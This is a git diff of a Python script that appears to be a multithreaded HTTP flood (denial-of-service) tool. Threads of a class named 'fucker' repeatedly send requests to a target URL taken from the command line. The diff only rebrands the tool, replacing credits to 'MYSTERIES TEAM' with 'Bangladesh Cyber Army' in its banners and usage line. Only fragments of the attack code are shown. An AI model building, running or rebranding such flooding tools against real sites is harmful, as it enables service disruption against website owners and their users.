@@ -1,5 +1,5 @@
 
-#THIS TOOLS CREATED BY MOHAMMAD AHAD
+#THIS TOOLS CREATED BY  Bangladesh Cyber Army [R3z7]
 
 try:
     import urllib.request, os, threading, time, random, sys
@@ -41,7 +41,7 @@ class fucker(threading.Thread):
         urllib.request.install_opener(opener) 
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
-        print("[MYSTERIES TEAM] AHAD [%s]\r"%(self.url))
+        print("[Bangladesh Cyber Army] R3ZU [%s]\r"%(self.url))
             
     def run(self):
         global Close, Request, Tot_req
@@ -51,7 +51,7 @@ class fucker(threading.Thread):
             try:
                 self.request()
             except:
-                sys.stdout.write("[MYSTERIES TEAM] AHAD [%s]\r"%(self.url))
+                sys.stdout.write("[Bangladesh Cyer Army] R3z7 [%s]\r"%(self.url))
                 sys.exit(0)
         sys.exit(0)
 
@@ -61,8 +61,8 @@ class MainLoop():
         global Close, Request, Tot_req
         print \
 ("""
-MYSTERIES-TEAM
-""")
+Bangladesh Cyber Army
+ """)
         try:
             url = sys.argv[1]
             hst = socket.gethostname()
@@ -86,7 +86,7 @@ MYSTERIES-TEAM
                 fucker(url, i + 1, in_line).start()
                 in_line = in_line[:-1]
         except:
-            print("Usage: python3 ahad.py https://example.com")
+            print("Usage: python3 R3z7.py https://example.com")
         
 if __name__ == '__main__':
     if sys.platform.startswith("linux"):
